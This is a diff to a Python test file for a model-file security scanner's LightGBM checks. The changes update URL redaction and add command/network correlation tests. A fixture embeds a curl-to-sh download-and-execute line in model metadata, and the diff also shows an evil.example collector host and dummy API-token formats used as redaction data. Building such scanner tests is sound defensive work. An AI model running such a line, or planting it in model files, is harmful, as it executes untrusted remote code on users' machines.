@@ -10,7 +10,7 @@ from modelaudit.core import determine_exit_code, scan_model_directory_or_file
 from modelaudit.models import ModelAuditResultModel
 from modelaudit.scanners import get_scanner_for_file
 from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, Check, CheckStatus, IssueSeverity, ScanResult
-from modelaudit.scanners.lightgbm_scanner import LightGBMScanner, _redact_url_for_display
+from modelaudit.scanners.lightgbm_scanner import LightGBMScanner
 from modelaudit.utils.file.detection import detect_file_format, detect_format_from_extension, validate_file_type
 
 
@@ -270,11 +270,11 @@ def test_lightgbm_read_failure_takes_operational_precedence_over_security_findin
 def test_scan_redacts_urls_in_lightgbm_findings(tmp_path: Path) -> None:
     path = tmp_path / "network_secret.model"
     hostname_secrets = [
+        "arbitrary-customer-secret-1234567890",
         "sk-" + ("a" * 30),
         "AIza" + ("a" * 35),
         "hf_" + ("a" * 36),
         "glpat-" + ("a" * 20),
-        "npm_" + ("a" * 36),
         "SG." + ("a" * 22) + "." + ("b" * 43),
         "eyJ" + ("a" * 18) + ".eyJ" + ("b" * 28) + "." + ("c" * 18),
     ]
@@ -304,19 +304,12 @@ def test_scan_redacts_urls_in_lightgbm_findings(tmp_path: Path) -> None:
     assert network_checks[0].details == {
         "examples": (
             [
-                {"line": "18", "type": "url", "value": "https://collector.evil.example"},
-                {"line": "19", "type": "url", "value": "https://collector.evil.example"},
-            ]
-            + [
-                {"line": str(20 + index), "type": "url", "value": "https://<redacted>.evil.example"}
-                for index in range(len(hostname_secrets))
-            ]
-            + [
                 {
-                    "line": str(20 + len(hostname_secrets)),
+                    "line": str(line_number),
                     "type": "url",
-                    "value": f"https://{benign_hostname}",
+                    "value_omitted": "model_text_may_contain_sensitive_literals",
                 }
+                for line_number in range(18, 21 + len(hostname_secrets))
             ]
         )
     }
@@ -332,21 +325,53 @@ def test_scan_redacts_urls_in_lightgbm_findings(tmp_path: Path) -> None:
     assert "lgb_bearer_secret" not in failed_details
     assert "lgb_standalone_secret" not in failed_details
     assert all(secret.lower() not in failed_details for secret in hostname_secrets)
+    assert benign_hostname not in failed_details
     assert "model_text_may_contain_sensitive_literals" in failed_details
     assert "payload.sh" not in failed_details
     assert "#frag" not in failed_details
 
 
-@pytest.mark.parametrize(
-    "hostname",
-    [
-        "sk-documentation-20260604.evil.example",
-        "hf_model-documentation.evil.example",
-        "aiza-documentation.evil.example",
-    ],
-)
-def test_lightgbm_url_redaction_preserves_benign_hostname_lookalikes(hostname: str) -> None:
-    assert _redact_url_for_display(f"https://{hostname}/model.txt") == f"https://{hostname}"
+def test_scan_correlates_command_with_trusted_download_url(tmp_path: Path) -> None:
+    path = tmp_path / "trusted_download.model"
+    path.write_text(
+        _build_lightgbm_text(
+            ["metadata=os.system('curl https://github.com/example/project/releases/payload.sh | sh')"]
+        ),
+        encoding="utf-8",
+    )
+
+    result = LightGBMScanner().scan(str(path))
+
+    network_checks = _check_by_name(result, "Network Indicator Check")
+    assert len(network_checks) == 1
+    assert network_checks[0].status == CheckStatus.FAILED
+    assert network_checks[0].details == {
+        "examples": [
+            {
+                "line": "18",
+                "type": "url",
+                "value_omitted": "model_text_may_contain_sensitive_literals",
+            }
+        ]
+    }
+    correlation_checks = _check_by_name(result, "Command/Network Correlation Check")
+    assert len(correlation_checks) == 1
+    assert correlation_checks[0].status == CheckStatus.FAILED
+    assert correlation_checks[0].severity == IssueSeverity.CRITICAL
+
+
+def test_scan_ignores_benign_trusted_reference_url(tmp_path: Path) -> None:
+    path = tmp_path / "trusted_reference.model"
+    path.write_text(
+        _build_lightgbm_text(["documentation=https://lightgbm.readthedocs.io/en/latest/"]),
+        encoding="utf-8",
+    )
+
+    result = LightGBMScanner().scan(str(path))
+
+    network_checks = _check_by_name(result, "Network Indicator Check")
+    assert len(network_checks) == 1
+    assert network_checks[0].status == CheckStatus.PASSED
 
 
 def test_scan_corrupt_file_fails_signature_validation(tmp_path: Path) -> None:
